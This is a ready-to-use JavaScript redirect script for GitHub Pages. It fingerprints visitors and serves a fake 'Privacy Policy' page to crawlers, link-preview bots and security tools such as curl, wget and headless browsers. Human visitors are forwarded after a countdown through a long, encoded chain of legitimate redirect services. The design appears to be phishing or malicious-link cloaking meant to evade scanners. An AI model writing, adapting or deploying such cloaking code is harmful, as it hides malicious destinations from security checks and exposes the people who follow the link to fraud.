// Advanced Redirect Script with Bot Detection and 4-Second Delay
// Compatible with GitHub Pages

(function() {
    'use strict';
    
    // Configuration
    const REDIRECT_URL = 'https://public-usa.mkt.dynamics.com/api/orgs/742da8ce-1b76-f011-8589-000d3a106307/r/8Uu2c1ToLUGfS8eugg4CAAIAAAA?msdynmkt_target=%7B%22TargetUrl%22%3A%22https%253A%252F%252Fwww.google.com%252Furl%253Fq%253Dhttps%25253A%25252F%25252Fdjyt-s04.eu1.hs-sales-engage.com%25252FCtc%25252FDQ%25252B23284%25252FdjYT-s04%25252FJll8VMXNW7YbdcM6lZ3ldW4dYkTk1Rrbh-W4tPVpb60ww0JV801_44gWhjKW5rqjJH5F1H7RW3QJ2681HBRQqN4QWjlSCKTbFW3rZcsT8Y-BC-W2NVKY_9dLn08W1_t_Vp7CtglFVZH6lx8MDHCwW2L9CGd3KHjt1W85p2wy4Vxb1lMLL8BlgWYWmW8rYBtj3fLWG7W4tpYXl4PCx10W6brBmy2bTLT8W86JWzW4_wgJcW2BVQrC1DNQHkVfx5BJ1NwZDtW5wkQZw5rFwGHW45gT5q7R9bSfW8dbz1K600zH-W1Zh_502nF7JQVGFBC27SZtkmW1JLPd67NRzcTW4xGvBk6rh7lRW7H8Lr11j9DPvVKZMFx93XZSgW7DzWF75pvFlLW8dMGjD70_V2kW2FbZcK8rF_gTW14GC0T4lrlTDW9b1PXf1-jkryW3KTkZ08Fx7ySW62fwDS9jjzBmW9b22Jb4f-dx3W3Z7Zjv6d-4tcW8QTVSH84KH_hW3h3By35VM83sW48ZNKx6RK8QkW7Ydwh_5dFZmNW45n-fS2RHN6DW9lnNtX1L9rb0W2m-pXX2KYh-dN6Y9thBmLDjkW2XK5Y02tDD3SW4vl5sY7mVZL1VsTbwX17gtnVW60BDYp6QGQk0W7yNm4h3mhmwpN5r4TrQrlHPrN3ccwj6t-P-bW7kpGbn68GwdHW398xDG6sbLCRW6Fkr9C5wWtlSW8fKrp-3PmdTgW6tWPSK3Wl6wNW25RtlS7HqjR7W91jRdf8m-DTJN8-D7MNNdh4KW8v7JJl5qCLCFW3DbcP090yNtSW5s8Wjf1qJ757W1B8xjl4TTxvJW7l8Z5t5LgPd9W35yK042g6zssW5K5PkN1Nd_MhW57H4HD4yrcJPW3H_rf77ckNnnN3ZtBF8c3hpPW5nhLKX7m4dvDW6Vx05W3Ljt_yW1zgw_N64Cq33W8b6wHg7726wGf5mwj0M04%2526sa%253DD%2526sntz%253D1%2526usg%253DAOvVaw2tpLERLriKYMm4csbeD_jo%22%2C%22RedirectOptions%22%3A%7B%225%22%3Anull%2C%221%22%3Anull%7D%7D&msdynmkt_digest=tJ7QG46gwp3uTHYYbojbBBeglZ308aNuXF%2FUyxOwWKg%3D&msdynmkt_secretVersion=a3955a744d9049f88dd8bdc1907bf2bf'; // Change this to your target URL
    const DELAY_SECONDS = 4;
    const LOADING_MESSAGE = 'Loading...';
    
    // Bot detection patterns
    const BOT_USER_AGENTS = [
        /bot/i, /spider/i, /crawler/i, /scraper/i, /facebookexternalhit/i,
        /twitterbot/i, /linkedinbot/i, /whatsapp/i, /telegram/i,
        /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
        /baiduspider/i, /yandexbot/i, /applebot/i, /petalbot/i,
        /curl/i, /wget/i, /python/i, /java/i, /php/i, /ruby/i,
        /go-http-client/i, /http/i, /okhttp/i, /apache-httpclient/i,
        /headlesschrome/i, /phantomjs/i, /selenium/i, /webdriver/i,
        /puppeteer/i, /playwright/i, /chrome-lighthouse/i,
        /postman/i, /insomnia/i, /rest-client/i, /api/i
    ];
    
    // Additional bot detection methods
    function detectBot() {
        const userAgent = navigator.userAgent;
        
        // Check user agent patterns
        for (let pattern of BOT_USER_AGENTS) {
            if (pattern.test(userAgent)) {
                return true;
            }
        }
        
        // Check for obvious automation indicators only
        if (navigator.webdriver === true) return true;
        if (window.callPhantom || window._phantom || window.phantom) return true;
        
        // Check screen dimensions (only extreme cases)
        if (screen.width === 0 || screen.height === 0) return true;
        
        return false;
    }
    
    // Check if accessing from suspicious referrer
    function checkReferrer() {
        const suspiciousReferrers = [
            'facebook.com', 'twitter.com', 'linkedin.com', 't.co',
            'instagram.com', 'whatsapp.com', 'telegram.org'
        ];
        
        const referrer = document.referrer.toLowerCase();
        return suspiciousReferrers.some(domain => referrer.includes(domain));
    }
    
    // Create loading interface
    function createLoadingInterface() {
        // Clear existing content
        document.body.innerHTML = '';
        
        // Apply styles
        document.body.style.cssText = `
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        `;
        
        // Create container
        const container = document.createElement('div');
        container.style.cssText = `
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 400px;
            width: 90%;
        `;
        
        // Create spinner
        const spinner = document.createElement('div');
        spinner.style.cssText = `
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        `;
        
        // Add spin animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
        
        // Create message
        const message = document.createElement('h2');
        message.textContent = LOADING_MESSAGE;
        message.style.cssText = `
            margin: 0 0 20px;
            font-size: 24px;
            font-weight: 300;
        `;
        
        // Create countdown
        const countdown = document.createElement('div');
        countdown.id = 'countdown';
        countdown.style.cssText = `
            font-size: 18px;
            opacity: 0.8;
        `;
        
        container.appendChild(spinner);
        container.appendChild(message);
        container.appendChild(countdown);
        document.body.appendChild(container);
        
        return countdown;
    }
    
    // Start countdown and redirect
    function startRedirect() {
        const countdownEl = createLoadingInterface();
        let timeLeft = DELAY_SECONDS;
        
        const updateCountdown = () => {
            countdownEl.textContent = `Redirecting in ${timeLeft} seconds...`;
            
            if (timeLeft <= 0) {
                countdownEl.textContent = 'Redirecting now...';
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
                return;
            }
            
            timeLeft--;
            setTimeout(updateCountdown, 1000);
        };
        
        updateCountdown();
    }
    
    // Block bots with fake content
    function blockBot() {
        document.body.innerHTML = '';
        document.body.style.cssText = `
            margin: 20px;
            font-family: Arial, sans-serif;
            background: white;
            color: black;
        `;
        
        const content = document.createElement('div');
        content.innerHTML = `
            <h1>Privacy Policy</h1>
            <p>This website respects your privacy and is committed to protecting your personal information.</p>
            <h2>Information We Collect</h2>
            <p>We may collect various types of information when you visit our website...</p>
            <h2>How We Use Information</h2>
            <p>We use the information we collect to provide and improve our services...</p>
            <h2>Contact Us</h2>
            <p>If you have questions about this Privacy Policy, please contact us at privacy@example.com</p>
        `;
        document.body.appendChild(content);
        
        // Prevent any redirects
        window.location.href = '#';
        return false;
    }
    
    // Main execution
    function main() {
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', main);
            return;
        }
        
        // Only block obvious bots, not legitimate browsers
        if (detectBot()) {
            blockBot();
            return;
        }
        
        // For legitimate browsers, proceed with redirect
        startRedirect();
    }
    
    // Handle different loading scenarios
    if (typeof window !== 'undefined') {
        main();
    }
    
    // Prevent common bot access methods
    Object.defineProperty(window, 'callPhantom', {
        get: () => blockBot
    });
    
    Object.defineProperty(window, '_phantom', {
        get: () => blockBot
    });
    
})();
